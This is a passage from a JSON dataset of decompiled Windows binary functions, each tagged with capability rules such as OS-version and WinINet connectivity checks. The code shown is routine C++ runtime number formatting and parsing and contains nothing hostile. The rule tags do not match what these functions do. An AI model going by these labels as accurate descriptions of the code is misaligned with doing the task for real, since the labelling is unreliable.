        "decompiled_code": "\nvoid fcn.180075be4(int64_t arg1, ulong noname_1, int64_t arg3)\n\n{\n    uint *arg3_00;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *puVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    uchar auStack56 [48];\n    \n    puVar4 = fcn.180074580(auStack56);\n    arg3_00 = arg1 + 0x2c;\n    uVar1 = puVar4[1];\n    uVar2 = puVar4[2];\n    uVar3 = puVar4[3];\n    *arg3_00 = *puVar4;\n    *(arg1 + 0x30) = uVar1;\n    *(arg1 + 0x34) = uVar2;\n    *(arg1 + 0x38) = uVar3;\n    uVar1 = puVar4[5];\n    uVar2 = puVar4[6];\n    uVar3 = puVar4[7];\n    *(arg1 + 0x3c) = puVar4[4];\n    *(arg1 + 0x40) = uVar1;\n    *(arg1 + 0x44) = uVar2;\n    *(arg1 + 0x48) = uVar3;\n    *(arg1 + 0x4c) = *(puVar4 + 8);\n    *(arg1 + 0x54) = puVar4[10];\n    iVar5 = fcn.1800b1914();\n    if (iVar5 != 0) {\n        fcn.18000d4c0(arg3 + 8, iVar5);\n        fcn.1800b2bb8(iVar5);\n    }\n    uVar6 = 0x1800e1df0;\n    if (*(arg3 + 8) != 0) {\n        uVar6 = *(arg3 + 8);\n    }\n    uVar6 = fcn.180075da8(uVar6, 0, arg3_00);\n    *(arg1 + 0x10) = uVar6;\n    iVar5 = fcn.1800b1a60();\n    if (iVar5 != 0) {\n        fcn.18000d4c0(arg3 + 0x18, iVar5);\n        fcn.1800b2bb8(iVar5);\n    }\n    uVar6 = 0x1800e1e50;\n    if (*(arg3 + 0x18) != 0) {\n        uVar6 = *(arg3 + 0x18);\n    }\n    uVar6 = fcn.180075da8(uVar6, 0, arg3_00);\n    *(arg1 + 0x18) = uVar6;\n    uVar6 = fcn.180075da8(0x1800e29e0, 0, arg3_00);\n    *(arg1 + 0x20) = uVar6;\n    return;\n}\n",
        "token_count": 673
    },
    "1800788f": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800788f0(ulong noname_0, uint *arg2, uint *arg3, int64_t arg4)\n\n{\n    char cVar1;\n    code *pcVar2;\n    ushort uVar3;\n    uint32_t uVar4;\n    uint8_t **ppuVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    ushort *puVar8;\n    char *pcVar9;\n    uint64_t uVar10;\n    ulong uVar11;\n    uint64_t uVar12;\n    int64_t iVar13;\n    uint *noname_2;\n    char *in_stack_00000030;\n    uint64_t in_stack_00000038;\n    uchar auStack248 [52];\n    uint16_t auStack196 [6];\n    ulong uStack184;\n    uint uStack176;\n    uint uStack172;\n    int64_t iStack168;\n    ulong uStack160;\n    int64_t iStack152;\n    uint *puStack144;\n    ulong uStack136;\n    ushort uStack128;\n    unkbyte6 Stack126;\n    uint64_t uStack112;\n    uint64_t uStack104;\n    char cStack96;\n    unkbyte7 Stack95;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint64_t uStack64;\n    \n    uStack136 = 0xfffffffffffffffe;\n    uStack64 = *0x180123080 ^ auStack248;\n    if ((in_stack_00000038 == 0) || (uVar12 = 1,  (*in_stack_00000030 - 0x2bU & 0xfd) != 0)) {\n        uVar12 = 0;\n    }\n    if ((*(arg4 + 0x18) & 0x3000) == 0x3000) {\n        uVar11 = 0x1800df780;\n        if (((uVar12 + 2 <= in_stack_00000038) && (in_stack_00000030[uVar12] == '0')) &&\n           ((in_stack_00000030[uVar12 + 1] + 0xa8U & 0xdf) == 0)) {\n            uVar12 = uVar12 + 2;\n        }\n    }\n    else {\n        uVar11 = 0x1800df77c;\n    }\n    pcVar9 = in_stack_00000030;\n    noname_2 = arg3;\n    iVar7 = arg4;\n    iStack168 = arg4;\n    puStack144 = arg2;\n    uStack184 = fcn.1800bb110(in_stack_00000030, uVar11, arg3, arg4);\n    auStack196[0] = 0x2e;\n    ppuVar5 = fcn.1800bb800(pcVar9);\n    auStack196[0] = auStack196[0] & 0xff00 | **ppuVar5;\n    uVar6 = fcn.1800bb110(in_stack_00000030, auStack196, noname_2, iVar7);\n    iVar7 = *(*(arg4 + 0x40) + 8);\n    iStack152 = iVar7;\n    (**0x1800de8f0)(iVar7);\n    uStack160 = fcn.180076930(&uStack160);\n    if ((iVar7 != 0) && (iVar7 = (**0x1800de8f0)(iVar7),  iVar7 != 0)) {\n        (**0x1800de8f0)(iVar7);\n    }\n    uStack112 = 0;\n    uStack104 = 7;\n    uStack128 = 0;\n    if (in_stack_00000038 < 8) {\n        uStack112 = in_stack_00000038;\n        if (in_stack_00000038 != 0) {\n            puVar8 = &uStack128;\n            for (uVar10 = in_stack_00000038; uVar10 != 0; uVar10 = uVar10 - 1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        (&uStack128)[in_stack_00000038] = 0;\n    }\n    else {\n        fcn.180075f80(&uStack128, in_stack_00000038);\n    }\n    puVar8 = &uStack128;\n    if (7 < uStack104) {\n        puVar8 = CONCAT62(Stack126, uStack128);\n    }\n    (**0x1800de8f0)(uStack160, in_stack_00000030, in_stack_00000030 + in_stack_00000038, puVar8);\n    iVar7 = *(*(arg4 + 0x40) + 8);\n    iStack152 = iVar7;\n    (**0x1800de8f0)(iVar7);\n    uVar11 = fcn.180077b3c(&uStack160);\n    if ((iVar7 != 0) && (iVar7 = (**0x1800de8f0)(iVar7),  iVar7 != 0)) {\n        (**0x1800de8f0)(iVar7, 1);\n    }\n    (**0x1800de8f0)(uVar11, &cStack96);\n    (**0x1800de8f0)();\n    if (uVar6 != in_stack_00000038) {\n        uVar3 = (**0x1800de8f0)();\n        puVar8 = &uStack128;\n        if (7 < uStack104) {\n            puVar8 = CONCAT62(Stack126, uStack128);\n        }\n        puVar8[uVar6] = uVar3;\n    }\n    if (uVar6 == in_stack_00000038) {\n        uVar6 = uStack184;\n    }\n    pcVar9 = &cStack96;\n    if (0xf < CONCAT44(uStack68, uStack72)) {\n        pcVar9 = CONCAT71(Stack95, cStack96);\n    }\n    while (((uVar10 = uStack112,  cVar1 = *pcVar9,  cVar1 != '\\x7f' && ('\\0' < cVar1)) && (cVar1 < uVar6 - uVar12))) {\n        uVar6 = uVar6 - cVar1;\n        fcn.1800891dc(&uStack128, uVar6, 1);\n        if ('\\0' < pcVar9[1]) {\n            pcVar9 = pcVar9 + 1;\n        }\n    }\n    uVar6 = *(arg4 + 0x28);\n    iVar7 = 0;\n    if ((0 < uVar6) && (uStack112 < uVar6)) {\n        iVar7 = uVar6 - uStack112;\n    }\n    uVar4 = *(arg4 + 0x18) & 0x1c0;\n    uStack184._0_4_ = *arg3;\n    uStack184._4_4_ = arg3[1];\n    uStack176 = arg3[2];\n    uStack172 = arg3[3];\n    uVar6 = uVar12;\n    if (uVar4 == 0x40) {\n        for (; uVar6 != 0; uVar6 = uVar6 - 1) {\n            fcn.180078370(&uStack184);\n            arg4 = iStack168;\n        }\n    }\n    else if (uVar4 == 0x100) {\n        for (; uVar6 != 0; uVar6 = uVar6 - 1) {\n            fcn.180078370(&uStack184);\n            arg4 = iStack168;\n        }\n        for (; iVar7 != 0; iVar7 = iVar7 + -1) {\n            fcn.180078370(&uStack184);\n        }\n        iVar7 = 0;\n    }\n    else {\n        for (; iVar7 != 0; iVar7 = iVar7 + -1) {\n            fcn.180078370(&uStack184);\n        }\n        iVar7 = 0;\n        for (; uVar6 != 0; uVar6 = uVar6 - 1) {\n            fcn.180078370(&uStack184);\n            arg4 = iStack168;\n        }\n    }\n    *arg3 = uStack184;\n    arg3[1] = uStack184._4_4_;\n    arg3[2] = uStack176;\n    arg3[3] = uStack172;\n    for (iVar13 = uVar10 - uVar12; iVar13 != 0; iVar13 = iVar13 + -1) {\n        fcn.180078370(&uStack184);\n        arg4 = iStack168;\n    }\n    *(arg4 + 0x28) = 0;\n    for (; iVar7 != 0; iVar7 = iVar7 + -1) {\n        fcn.180078370(&uStack184);\n    }\n    *puStack144 = uStack184;\n    puStack144[1] = uStack184._4_4_;\n    puStack144[2] = uStack176;\n    puStack144[3] = uStack172;\n    uVar12 = CONCAT44(uStack68, uStack72);\n    if (0xf < uVar12) {\n        iVar13 = CONCAT71(Stack95, cStack96);\n        iVar7 = iVar13;\n        if (0xfff < uVar12 + 1) {\n            iVar7 = *(iVar13 + -8);\n            if (0x1f < (iVar13 - iVar7) - 8U) {\n                fcn.1800b3528(iVar7, uVar12 + 0x28);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar7);\n    }\n    uStack80 = *0x180101910;\n    uStack76 = *0x180101914;\n    uStack72 = *0x180101918;\n    uStack68 = *0x18010191c;\n    cStack96 = '\\0';\n    fcn.180003e40(&uStack128);\n    fcn.18008fb00(uStack64 ^ auStack248);\n    return;\n}\n",
        "token_count": 2287
    },
    "180078db": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180078db8(ulong noname_0, uint *arg2, uint *arg3, int64_t arg4)\n\n{\n    char cVar1;\n    code *pcVar2;\n    ushort uVar3;\n    uint32_t uVar4;\n    uint8_t **ppuVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    ushort *puVar8;\n    char *pcVar9;\n    uint64_t uVar10;\n    ulong uVar11;\n    uint64_t uVar12;\n    int64_t iVar13;\n    uint *noname_2;\n    char *in_stack_00000030;\n    uint64_t in_stack_00000038;\n    uchar auStack248 [52];\n    uint16_t auStack196 [6];\n    ulong uStack184;\n    uint uStack176;\n    uint uStack172;\n    int64_t iStack168;\n    ulong uStack160;\n    int64_t iStack152;\n    uint *puStack144;\n    ulong uStack136;\n    ushort uStack128;\n    unkbyte6 Stack126;\n    uint64_t uStack112;\n    uint64_t uStack104;\n    char cStack96;\n    unkbyte7 Stack95;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint64_t uStack64;\n    \n    uStack136 = 0xfffffffffffffffe;\n    uStack64 = *0x180123080 ^ auStack248;\n    if ((in_stack_00000038 == 0) || (uVar12 = 1,  (*in_stack_00000030 - 0x2bU & 0xfd) != 0)) {\n        uVar12 = 0;\n    }\n    if ((*(arg4 + 0x18) & 0x3000) == 0x3000) {\n        uVar11 = 0x1800df780;\n        if (((uVar12 + 2 <= in_stack_00000038) && (in_stack_00000030[uVar12] == '0')) &&\n           ((in_stack_00000030[uVar12 + 1] + 0xa8U & 0xdf) == 0)) {\n            uVar12 = uVar12 + 2;\n        }\n    }\n    else {\n        uVar11 = 0x1800df77c;\n    }\n    pcVar9 = in_stack_00000030;\n    noname_2 = arg3;\n    iVar7 = arg4;\n    iStack168 = arg4;\n    puStack144 = arg2;\n    uStack184 = fcn.1800bb110(in_stack_00000030, uVar11, arg3, arg4);\n    auStack196[0] = 0x2e;\n    ppuVar5 = fcn.1800bb800(pcVar9);\n    auStack196[0] = auStack196[0] & 0xff00 | **ppuVar5;\n    uVar6 = fcn.1800bb110(in_stack_00000030, auStack196, noname_2, iVar7);\n    iVar7 = *(*(arg4 + 0x40) + 8);\n    iStack152 = iVar7;\n    (**0x1800de8f0)(iVar7);\n    uStack160 = fcn.180014560(&uStack160);\n    if ((iVar7 != 0) && (iVar7 = (**0x1800de8f0)(iVar7),  iVar7 != 0)) {\n        (**0x1800de8f0)(iVar7);\n    }\n    uStack112 = 0;\n    uStack104 = 7;\n    uStack128 = 0;\n    if (in_stack_00000038 < 8) {\n        uStack112 = in_stack_00000038;\n        if (in_stack_00000038 != 0) {\n            puVar8 = &uStack128;\n            for (uVar10 = in_stack_00000038; uVar10 != 0; uVar10 = uVar10 - 1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        (&uStack128)[in_stack_00000038] = 0;\n    }\n    else {\n        fcn.180013c50(&uStack128, in_stack_00000038);\n    }\n    puVar8 = &uStack128;\n    if (7 < uStack104) {\n        puVar8 = CONCAT62(Stack126, uStack128);\n    }\n    (**0x1800de8f0)(uStack160, in_stack_00000030, in_stack_00000030 + in_stack_00000038, puVar8);\n    iVar7 = *(*(arg4 + 0x40) + 8);\n    iStack152 = iVar7;\n    (**0x1800de8f0)(iVar7);\n    uVar11 = fcn.180077c70(&uStack160);\n    if ((iVar7 != 0) && (iVar7 = (**0x1800de8f0)(iVar7),  iVar7 != 0)) {\n        (**0x1800de8f0)(iVar7, 1);\n    }\n    (**0x1800de8f0)(uVar11, &cStack96);\n    (**0x1800de8f0)();\n    if (uVar6 != in_stack_00000038) {\n        uVar3 = (**0x1800de8f0)();\n        puVar8 = &uStack128;\n        if (7 < uStack104) {\n            puVar8 = CONCAT62(Stack126, uStack128);\n        }\n        puVar8[uVar6] = uVar3;\n    }\n    if (uVar6 == in_stack_00000038) {\n        uVar6 = uStack184;\n    }\n    pcVar9 = &cStack96;\n    if (0xf < CONCAT44(uStack68, uStack72)) {\n        pcVar9 = CONCAT71(Stack95, cStack96);\n    }\n    while (((uVar10 = uStack112,  cVar1 = *pcVar9,  cVar1 != '\\x7f' && ('\\0' < cVar1)) && (cVar1 < uVar6 - uVar12))) {\n        uVar6 = uVar6 - cVar1;\n        fcn.180089288(&uStack128, uVar6, 1);\n        if ('\\0' < pcVar9[1]) {\n            pcVar9 = pcVar9 + 1;\n        }\n    }\n    uVar6 = *(arg4 + 0x28);\n    iVar7 = 0;\n    if ((0 < uVar6) && (uStack112 < uVar6)) {\n        iVar7 = uVar6 - uStack112;\n    }\n    uVar4 = *(arg4 + 0x18) & 0x1c0;\n    uStack184._0_4_ = *arg3;\n    uStack184._4_4_ = arg3[1];\n    uStack176 = arg3[2];\n    uStack172 = arg3[3];\n    uVar6 = uVar12;\n    if (uVar4 == 0x40) {\n        for (; uVar6 != 0; uVar6 = uVar6 - 1) {\n            fcn.180078370(&uStack184);\n            arg4 = iStack168;\n        }\n    }\n    else if (uVar4 == 0x100) {\n        for (; uVar6 != 0; uVar6 = uVar6 - 1) {\n            fcn.180078370(&uStack184);\n            arg4 = iStack168;\n        }\n        for (; iVar7 != 0; iVar7 = iVar7 + -1) {\n            fcn.180078370(&uStack184);\n        }\n        iVar7 = 0;\n    }\n    else {\n        for (; iVar7 != 0; iVar7 = iVar7 + -1) {\n            fcn.180078370(&uStack184);\n        }\n        iVar7 = 0;\n        for (; uVar6 != 0; uVar6 = uVar6 - 1) {\n            fcn.180078370(&uStack184);\n            arg4 = iStack168;\n        }\n    }\n    *arg3 = uStack184;\n    arg3[1] = uStack184._4_4_;\n    arg3[2] = uStack176;\n    arg3[3] = uStack172;\n    for (iVar13 = uVar10 - uVar12; iVar13 != 0; iVar13 = iVar13 + -1) {\n        fcn.180078370(&uStack184);\n        arg4 = iStack168;\n    }\n    *(arg4 + 0x28) = 0;\n    for (; iVar7 != 0; iVar7 = iVar7 + -1) {\n        fcn.180078370(&uStack184);\n    }\n    *puStack144 = uStack184;\n    puStack144[1] = uStack184._4_4_;\n    puStack144[2] = uStack176;\n    puStack144[3] = uStack172;\n    uVar12 = CONCAT44(uStack68, uStack72);\n    if (0xf < uVar12) {\n        iVar13 = CONCAT71(Stack95, cStack96);\n        iVar7 = iVar13;\n        if (0xfff < uVar12 + 1) {\n            iVar7 = *(iVar13 + -8);\n            if (0x1f < (iVar13 - iVar7) - 8U) {\n                fcn.1800b3528(iVar7, uVar12 + 0x28);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar7);\n    }\n    uStack80 = *0x180101910;\n    uStack76 = *0x180101914;\n    uStack72 = *0x180101918;\n    uStack68 = *0x18010191c;\n    cStack96 = '\\0';\n    fcn.180003e40(&uStack128);\n    fcn.18008fb00(uStack64 ^ auStack248);\n    return;\n}\n",
        "token_count": 2284
    },
    "18007cb0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.18007cb04(ulong noname_0, char *arg2, ulong arg3, ulong arg4)\n\n{\n    ushort *puVar1;\n    code *pcVar2;\n    uint64_t uVar3;\n    char cVar4;\n    char cVar5;\n    int16_t iVar6;\n    int16_t iVar7;\n    ulong uVar8;\n    char *pcVar9;\n    uint32_t uVar10;\n    int16_t *piVar11;\n    uint64_t uVar12;\n    ulong ****ppppuVar13;\n    int64_t iVar14;\n    char *pcVar15;\n    uint64_t uVar16;\n    char *pcVar17;\n    uint32_t uVar18;\n    uint32_t in_stack_00000028;\n    ulong in_stack_00000030;\n    uchar auStack280 [48];\n    char cStack232;\n    char cStack231;\n    int16_t iStack230;\n    uint32_t uStack228;\n    uint64_t uStack224;\n    ulong uStack216;\n    char *pcStack208;\n    char *pcStack200;\n    ulong uStack192;\n    char cStack184;\n    uchar uStack183;\n    unkbyte6 Stack182;\n    uint64_t uStack168;\n    uint64_t uStack160;\n    ulong ****appppuStack152 [2];\n    int64_t iStack136;\n    uint64_t uStack128;\n    int16_t aiStack120 [26];\n    int16_t aiStack68 [2];\n    uint64_t uStack64;\n    \n    uStack192 = 0xfffffffffffffffe;\n    uStack64 = *0x180123080 ^ auStack280;\n    uStack216 = arg4;\n    pcStack200 = arg2;\n    uVar8 = fcn.180077b3c(in_stack_00000030);\n    (**0x1800de8f0)(uVar8, appppuStack152);\n    if (iStack136 == 0) {\n        iStack230 = 0;\n    }\n    else {\n        iStack230 = (**0x1800de8f0)(uVar8);\n    }\n    uVar8 = fcn.180076930(in_stack_00000030);\n    (**0x1800de8f0)(uVar8, 0x1800e2a70, 0x1800e2a8b);\n    cVar4 = fcn.1800890e8(arg3, arg4);\n    pcVar17 = arg2;\n    if (cVar4 == '\\0') {\n        iVar6 = fcn.1800783e4(arg3);\n        if (iVar6 == aiStack120[23]) {\n            *arg2 = '+';\n        }\n        else {\n            iVar6 = fcn.1800783e4(arg3);\n            if (iVar6 != aiStack120[22]) goto code_r0x00018007cc07;\n            *arg2 = '-';\n        }\n        fcn.18007f190(arg3);\n        pcVar17 = arg2 + 1;\n    }\ncode_r0x00018007cc07:\n    uVar10 = in_stack_00000028 & 0xe00;\n    uStack224 = 10;\n    uVar18 = -(uVar10 != 0) & 10;\n    if (uVar10 == 0x800) {\n        uVar18 = 0x10;\n    }\n    if (uVar10 == 0x400) {\n        uVar18 = 8;\n    }\n    cStack184 = '\\0';\n    cStack232 = '\\0';\n    cStack231 = '\\0';\n    uStack228 = uVar18;\n    cVar4 = fcn.1800890e8(arg3, arg4);\n    if ((cVar4 == '\\0') && (iVar6 = fcn.1800783e4(arg3),  iVar6 == aiStack120[0])) {\n        cStack184 = '\\x01';\n        cStack232 = '\\x01';\n        fcn.18007f190(arg3);\n        cVar4 = fcn.1800890e8(arg3, arg4);\n        if ((cVar4 != '\\0') ||\n           (((iVar6 = fcn.1800783e4(arg3),  iVar6 != aiStack120[25] &&\n             (iVar6 = fcn.1800783e4(arg3),  iVar6 != aiStack120[24])) || ((uVar18 & 0xffffffef) != 0)))) {\n            uStack228 = uVar18;\n            if (uVar18 == 0) {\n                uVar18 = 8;\n                uStack228 = uVar18;\n            }\n            goto code_r0x00018007ccf1;\n        }\n        uVar18 = 0x10;\n        uStack228 = 0x10;\n        cStack184 = '\\0';\n        cStack232 = '\\0';\n        fcn.18007f190(arg3);\ncode_r0x00018007ccfb:\n        uStack224 = 0x16;\n        if (uVar18 == 8) {\n            uStack224 = 8;\n        }\n    }\n    else {\ncode_r0x00018007ccf1:\n        if ((uVar18 != 0) && (uVar18 != 10)) goto code_r0x00018007ccfb;\n    }\n    uVar16 = 0xf;\n    uStack160 = 0xf;\n    uStack183 = 0;\n    uStack168 = 1;\n    iVar14 = 0;\n    pcStack208 = arg2 + 0x1f;\n    cVar5 = fcn.1800890e8(arg3, uStack216);\n    uVar3 = uStack224;\n    iVar6 = iStack230;\n    pcVar15 = CONCAT62(Stack182, CONCAT11(uStack183, cStack184));\n    cVar4 = cStack232;\n    if (cVar5 == '\\0') {\n        do {\n            iVar7 = fcn.1800783e4(arg3);\n            piVar11 = aiStack120;\n            do {\n                if (*piVar11 == iVar7) break;\n                piVar11 = piVar11 + 1;\n            } while (piVar11 != aiStack68);\n            uVar12 = piVar11 - aiStack120 >> 1;\n            if (uVar12 < uVar3) {\n                cVar4 = *(uVar12 + 0x1800e2a70);\n                *pcVar17 = cVar4;\n                if (((cStack231 != '\\0') || (cVar4 != '0')) && (pcVar17 < pcStack208)) {\n                    pcVar17 = pcVar17 + 1;\n                    cStack231 = '\\x01';\n                }\n                cStack232 = '\\x01';\n                pcVar9 = &cStack184;\n                if (0xf < uVar16) {\n                    pcVar9 = pcVar15;\n                }\n                if (pcVar9[iVar14] != '\\x7f') {\n                    pcVar9 = &cStack184;\n                    if (0xf < uVar16) {\n                        pcVar9 = pcVar15;\n                    }\n                    pcVar9[iVar14] = pcVar9[iVar14] + '\\x01';\n                    goto code_r0x00018007ce3c;\n                }\n            }\n            else {\n                pcVar9 = &cStack184;\n                if (0xf < uVar16) {\n                    pcVar9 = pcVar15;\n                }\n                if (((pcVar9[iVar14] == '\\0') || (iVar6 == 0)) || (iVar7 = fcn.1800783e4(arg3),  iVar7 != iVar6)) break;\n                if (uStack168 < uVar16) {\n                    pcVar9 = &cStack184;\n                    if (0xf < uVar16) {\n                        pcVar9 = pcVar15;\n                    }\n                    puVar1 = pcVar9 + uStack168;\n                    uStack168 = uStack168 + 1;\n                    *puVar1 = 0;\n                }\n                else {\n                    fcn.180013eb0(&cStack184, 1);\n                }\n                iVar14 = iVar14 + 1;\ncode_r0x00018007ce3c:\n                pcVar15 = CONCAT62(Stack182, CONCAT11(uStack183, cStack184));\n                uVar16 = uStack160;\n            }\n            fcn.18007f190(arg3);\n            cVar4 = fcn.1800890e8(arg3, uStack216);\n        } while (cVar4 == '\\0');\n        arg2 = pcStack200;\n        cVar4 = cStack232;\n        if (iVar14 != 0) {\n            pcVar9 = &cStack184;\n            if (0xf < uVar16) {\n                pcVar9 = pcVar15;\n            }\n            if (pcVar9[iVar14] < '\\x01') {\n                cVar4 = '\\0';\n            }\n            else {\n                iVar14 = iVar14 + 1;\n            }\n        }\n    }\n    ppppuVar13 = appppuStack152;\n    if (0xf < uStack128) {\n        ppppuVar13 = appppuStack152[0];\n    }\n    if (cVar4 != '\\0') {\n        while ((iVar14 != 0 && (cVar4 = *ppppuVar13,  cVar4 != '\\x7f'))) {\n            iVar14 = iVar14 + -1;\n            if (iVar14 != 0) {\n                pcVar9 = &cStack184;\n                if (0xf < uVar16) {\n                    pcVar9 = pcVar15;\n                }\n                if (cVar4 != pcVar9[iVar14]) goto code_r0x00018007cf04;\n            }\n            if (iVar14 == 0) {\n                pcVar9 = &cStack184;\n                if (0xf < uVar16) {\n                    pcVar9 = pcVar15;\n                }\n                if (cVar4 < *pcVar9) goto code_r0x00018007cf04;\n            }\n            if ('\\0' < *(ppppuVar13 + 1)) {\n                ppppuVar13 = ppppuVar13 + 1;\n            }\n        }\n        arg2 = pcVar17;\n        if (cStack231 == '\\0') {\n            *pcVar17 = '0';\n            arg2 = pcVar17 + 1;\n        }\n    }\ncode_r0x00018007cf04:\n    *arg2 = '\\0';\n    if (0xf < uVar16) {\n        pcVar17 = pcVar15;\n        if ((0xfff < uVar16 + 1) && (pcVar17 = *(pcVar15 + -8),  0x1f < pcVar15 + (-8 - pcVar17)))\n        goto code_r0x00018007cfa3;\n        fcn.18008fb24(pcVar17);\n    }\n    if (0xf < uStack128) {\n        ppppuVar13 = appppuStack152[0];\n        if (0xfff < uStack128 + 1) {\n            ppppuVar13 = appppuStack152[0][-1];\n            if (0x1f < appppuStack152[0] + (-8 - ppppuVar13)) {\n                fcn.1800b3528(ppppuVar13, uStack128 + 0x28);\ncode_r0x00018007cfa3:\n                fcn.1800b3528();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.18008fb24(ppppuVar13);\n    }\n    fcn.18008fb00(uStack64 ^ auStack280);\n    return;\n}\n",
        "token_count": 2601
    },
    "18007cfa": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.18007cfac(ulong noname_0, char *arg2, ulong arg3, ulong arg4)\n\n{\n    ushort *puVar1;\n    code *pcVar2;\n    uint64_t uVar3;\n    char cVar4;\n    char cVar5;\n    int16_t iVar6;\n    int16_t iVar7;\n    ulong uVar8;\n    char *pcVar9;\n    uint32_t uVar10;\n    int16_t *piVar11;\n    uint64_t uVar12;\n    ulong ****ppppuVar13;\n    int64_t iVar14;\n    char *pcVar15;\n    uint64_t uVar16;\n    char *pcVar17;\n    uint32_t uVar18;\n    uint32_t in_stack_00000028;\n    ulong in_stack_00000030;\n    uchar auStack280 [48];\n    char cStack232;\n    char cStack231;\n    int16_t iStack230;\n    uint32_t uStack228;\n    uint64_t uStack224;\n    ulong uStack216;\n    char *pcStack208;\n    char *pcStack200;\n    ulong uStack192;\n    char cStack184;\n    uchar uStack183;\n    unkbyte6 Stack182;\n    uint64_t uStack168;\n    uint64_t uStack160;\n    ulong ****appppuStack152 [2];\n    int64_t iStack136;\n    uint64_t uStack128;\n    int16_t aiStack120 [26];\n    int16_t aiStack68 [2];\n    uint64_t uStack64;\n    \n    uStack192 = 0xfffffffffffffffe;\n    uStack64 = *0x180123080 ^ auStack280;\n    uStack216 = arg4;\n    pcStack200 = arg2;\n    uVar8 = fcn.180077c70(in_stack_00000030);\n    (**0x1800de8f0)(uVar8, appppuStack152);\n    if (iStack136 == 0) {\n        iStack230 = 0;\n    }\n    else {\n        iStack230 = (**0x1800de8f0)(uVar8);\n    }\n    uVar8 = fcn.180014560(in_stack_00000030);\n    (**0x1800de8f0)(uVar8, \"0123456789ABCDEFabcdef-+Xx\", 0x1800e2acb);\n    cVar4 = fcn.1800890e8(arg3, arg4);\n    pcVar17 = arg2;\n    if (cVar4 == '\\0') {\n        iVar6 = fcn.1800783e4(arg3);\n        if (iVar6 == aiStack120[23]) {\n            *arg2 = '+';\n        }\n        else {\n            iVar6 = fcn.1800783e4(arg3);\n            if (iVar6 != aiStack120[22]) goto code_r0x00018007d0af;\n            *arg2 = '-';\n        }\n        fcn.18007f190(arg3);\n        pcVar17 = arg2 + 1;\n    }\ncode_r0x00018007d0af:\n    uVar10 = in_stack_00000028 & 0xe00;\n    uStack224 = 10;\n    uVar18 = -(uVar10 != 0) & 10;\n    if (uVar10 == 0x800) {\n        uVar18 = 0x10;\n    }\n    if (uVar10 == 0x400) {\n        uVar18 = 8;\n    }\n    cStack184 = '\\0';\n    cStack232 = '\\0';\n    cStack231 = '\\0';\n    uStack228 = uVar18;\n    cVar4 = fcn.1800890e8(arg3, arg4);\n    if ((cVar4 == '\\0') && (iVar6 = fcn.1800783e4(arg3),  iVar6 == aiStack120[0])) {\n        cStack184 = '\\x01';\n        cStack232 = '\\x01';\n        fcn.18007f190(arg3);\n        cVar4 = fcn.1800890e8(arg3, arg4);\n        if ((cVar4 != '\\0') ||\n           (((iVar6 = fcn.1800783e4(arg3),  iVar6 != aiStack120[25] &&\n             (iVar6 = fcn.1800783e4(arg3),  iVar6 != aiStack120[24])) || ((uVar18 & 0xffffffef) != 0)))) {\n            uStack228 = uVar18;\n            if (uVar18 == 0) {\n                uVar18 = 8;\n                uStack228 = uVar18;\n            }\n            goto code_r0x00018007d199;\n        }\n        uVar18 = 0x10;\n        uStack228 = 0x10;\n        cStack184 = '\\0';\n        cStack232 = '\\0';\n        fcn.18007f190(arg3);\ncode_r0x00018007d1a3:\n        uStack224 = 0x16;\n        if (uVar18 == 8) {\n            uStack224 = 8;\n        }\n    }\n    else {\ncode_r0x00018007d199:\n        if ((uVar18 != 0) && (uVar18 != 10)) goto code_r0x00018007d1a3;\n    }\n    uVar16 = 0xf;\n    uStack160 = 0xf;\n    uStack183 = 0;\n    uStack168 = 1;\n    iVar14 = 0;\n    pcStack208 = arg2 + 0x1f;\n    cVar5 = fcn.1800890e8(arg3, uStack216);\n    uVar3 = uStack224;\n    iVar6 = iStack230;\n    pcVar15 = CONCAT62(Stack182, CONCAT11(uStack183, cStack184));\n    cVar4 = cStack232;\n    if (cVar5 == '\\0') {\n        do {\n            iVar7 = fcn.1800783e4(arg3);\n            piVar11 = aiStack120;\n            do {\n                if (*piVar11 == iVar7) break;\n                piVar11 = piVar11 + 1;\n            } while (piVar11 != aiStack68);\n            uVar12 = piVar11 - aiStack120 >> 1;\n            if (uVar12 < uVar3) {\n                cVar4 = \"0123456789ABCDEFabcdef-+Xx\"[uVar12];\n                *pcVar17 = cVar4;\n                if (((cStack231 != '\\0') || (cVar4 != '0')) && (pcVar17 < pcStack208)) {\n                    pcVar17 = pcVar17 + 1;\n                    cStack231 = '\\x01';\n                }\n                cStack232 = '\\x01';\n                pcVar9 = &cStack184;\n                if (0xf < uVar16) {\n                    pcVar9 